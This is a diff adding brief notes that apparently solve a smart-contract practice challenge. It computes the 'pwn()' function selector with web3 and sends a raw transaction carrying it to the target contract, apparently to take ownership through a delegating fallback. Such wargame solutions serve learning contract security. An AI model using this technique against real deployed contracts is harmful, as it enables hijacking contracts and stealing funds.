@@ -1,0 +1,8 @@
+Run in nodejs
+
+web3.eth.abi.encodeFunctionSignature("pwn()");
+
+> '0xdd365b8b'
+
+tx = {to: contract.address, data: "0xdd365b8b", value: 0, from: player};
+await sendTransaction(tx);
